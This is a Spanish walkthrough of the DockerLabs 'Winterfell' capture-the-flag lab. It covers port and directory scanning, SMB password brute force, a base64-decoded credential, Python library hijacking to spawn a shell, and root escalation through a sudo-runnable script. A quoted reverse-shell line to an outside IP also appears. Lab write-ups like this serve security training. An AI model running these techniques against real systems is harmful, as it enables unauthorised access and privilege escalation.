---
title: Winterfell - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | Zunderrub        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/d02bd468-5cb4-4664-ac53-54895be6a3e6)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
- `139` (NetBIOS)
- `445` (SMB)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80,139,445 -sCV 172.17.0.2 -oG targeted 
```
![image](https://github.com/user-attachments/assets/5a19181c-9271-406b-b7ba-72e6e97392bc)

# Exploración Web
Al navegar al puerto `80`, descubrimos un sitio web con temática de Juego de Tronos.

![image](https://github.com/user-attachments/assets/42605eb6-89ea-404a-8f13-81905647e102)

No vemos nada interesante, pero nos quedaremos con este mensaje por si resulta imprensidible para averiguar como acceder.

` -- Jon: Tengo que conseguir que Arya lleve el mensaje a Daenerys para que nos mande su apoyo y el de sus dragones` 

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

 ![image](https://github.com/user-attachments/assets/80335fa0-eb83-4e74-a7c4-a10d96e1e2fa)

Descubrimos `/dragon`, donde accedemos a` EpisodiosT1`. Utilizaremos los nombres de los episodios como posibles contraseñas.

![image](https://github.com/user-attachments/assets/eb33de46-2ffb-43a3-938d-139862f7374b)

# Fuerza Bruta en SMB

Generamos un archivo `episodios.txt` con los nombres de los episodios y usamos `crackmapexec` para realizar fuerza bruta:

![image](https://github.com/user-attachments/assets/0936c97f-7489-45af-bbf3-5c8bf5ecaf8b)

```bash
crackmapexec smb 172.17.0.2 -u 'jon' -p episodios.txt 
```
![image](https://github.com/user-attachments/assets/4cc1418f-9bc3-4ebb-b877-1107be74268a)

Vemos el usuario "`jon`" con contraseña "`seacercaelinvierno`", ahora on `smbmap`, identificamos recursos compartidos:.

```bash
smbmap -u 'jon' -p 'seacercaelinvierno' -H 172.17.0.2
```
![image](https://github.com/user-attachments/assets/c94705f1-1e80-4316-98c9-7eec954dd3e4)

Accedemos a la carpeta `shared` con `smbclient` y descargamos `proteccion_del_reino`:

```bash
smbclient //172.17.0.2/shared -U 'jon'
```

![image](https://github.com/user-attachments/assets/f1dbbc72-4032-4549-af13-d7b1a0f8a684)

Al abrir el mesajes vemos que contiene lo siguiente 

```txt
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```
Desciframos la contraseña en Base64:

```bash
echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
```

Nos devuelve la contraseña `hijodelanister`.

# Acceso ssh

Conectamos al servicio **SSH** como `jon` usando la contraseña descifrada:

![image](https://github.com/user-attachments/assets/e807bdb7-6485-4c15-b64c-384445718536)

# Escalada de privilegios 

## Usuario aria

Al ejecutar `sudo -l`, notamos que tiene permisos para ejecutar `python3` como `aria` en `.mensaje.py`.Utilizando [GTFOBins](https://gtfobins.github.io/) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/64e7557c-d1f4-4a4a-9e21-03eef79bd91e)

Viendo el contenido de el script se están importando dos librerías pero no tienen su ruta absoluta por lo que se podría acontecer un `Library Hijacking`.

![image](https://github.com/user-attachments/assets/e8410883-92a0-469d-8d0f-49c418867e0e)

Creamos un archivo con el nombre de una de las librerías usadas por el script:

![image](https://github.com/user-attachments/assets/cb6628ac-2b09-4993-98ed-f7fc52b522e7)

```bash
import os
os.system("/bin/bash")
```
Ejecutamos el script:
```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```
Ahora somos `aria`.

![image](https://github.com/user-attachments/assets/4b480cb2-d5bb-4a6b-ae8c-59aecba1732b)

## Usuario daenerys

Volvemos a ejecutra `sudo -l`, notamos que tiene permisos para ejecutar `cat` y `ls` como `daenerys`.Utilizando [GTFOBins](https://gtfobins.github.io/) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/fd6b8a89-e0ad-4e5c-9e60-a0921eeafb91)

Exploramos el directorio y encontramos un mensaje con la contraseña de daenerys. 

![image](https://github.com/user-attachments/assets/6d77c82d-c1ec-4882-b0a4-4ea67edcb03b)

Usamos SSH para acceder:

![image](https://github.com/user-attachments/assets/38f6d752-190b-4dd4-a40d-9889fae745df)

# Root

Volvemos a ejecutra `sudo -l`, notamos que tiene permisos para ejecutar `bash` como `root` en el archivo `/home/daenerys/.secret/.shell.sh`.Utilizando [GTFOBins](https://gtfobins.github.io/) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/62f3db3c-e1d3-4072-b734-f3bd21fb8acb)

Este es el contenido:

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.234.42/443 0>&1
```

Modificamos el contenido del script para obtener una shell como root:

```
#!/bin/bash

bash -p
```

Ejecutamos el script:

![image](https://github.com/user-attachments/assets/79125ec4-9a7c-4e98-ac17-21858edb5295)

Ya somos root

